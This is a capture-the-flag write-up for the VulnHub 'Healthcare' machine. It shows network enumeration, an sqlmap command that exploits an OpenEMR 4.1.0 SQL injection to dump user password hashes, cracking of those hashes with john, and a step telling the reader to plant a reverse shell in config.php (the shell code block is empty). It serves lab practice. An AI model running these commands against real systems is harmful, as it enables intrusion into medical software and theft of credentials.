# Healthcare

### 1.Get VM IP

```bash
root@kali: arp-scan -I eth0 -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	0a:00:27:00:00:13	(Unknown: locally administered)
192.168.56.100	08:00:27:ec:52:57	PCS Systemtechnik GmbH
192.168.56.135	08:00:27:34:e9:a5	PCS Systemtechnik GmbH
```

The IP address is `192.168.56.135`, let's enumerate it.

### 2.Enumeration

```bash
root@kali: nmap -sV -sC -v 192.168.56.135
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3d
80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-title: Coming Soon 2
MAC Address: 08:00:27:34:E9:A5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix
```

i begin with port 21 and check anonymous login, but no chance

on port 80 we see nothing intresting too, so i began fuzzing the directories, i tried several wordlists for directory bruteforcing but no chance

finally i used this wordlist `danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-big.txt` and found this :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/d69df255-75e2-4e4a-82a2-4a08b9b5a082)

let's visit this new directory :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/61744c55-fcbe-4ad2-8cb4-b5afc0d24054)

as we can see the version of OpenEMR that is `4.1.0`, we search in searchsploit to find any vulns :

```bash
root@kali: searchsploit openemr
OpenEMR 4.1.0 - 'u' SQL Injection | php/webapps/49742.py
```

on this code we see that there is a vulnerable endpoint and parameter i just copied it and used it in sqlmap :

```bash
root@kali: sqlmap -u "http://192.168.56.135/openemr/interface/login/validateUser.php?u=" -p 'u' --batch -D openemr -T users -C username,password --dump

Database: openemr
Table: users
[2 entries]
+----------+------------------------------------------+
| username | password                                 |
+----------+------------------------------------------+
| admin    | 3863efef9ee2bfbc51ecdca359c6302bed1389e8 |
| medical  | ab24aed5a7c4ad45615cd7e0da816eea39e4895d |
+----------+------------------------------------------+

```

now we can easily crack those hashes with john :

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /root/.john
Press 'q' or Ctrl-C to abort, almost any other key for status
medical          (?)     
ackbar           (?)     
2g 0:00:00:00 DONE (2024-06-11 08:34) 13.33g/s 6909Kp/s 6909Kc/s 6966KC/s acl405..acjy98
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```

and yes, we can login to website with `admin:ackbar` :


### 3.Gaining Shell


![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a1677583-2ec6-4b5f-ae91-4e5dda63db24)

put your revshell in `config.php` and start a listener on your machine and you will get the shell :

```bash

```




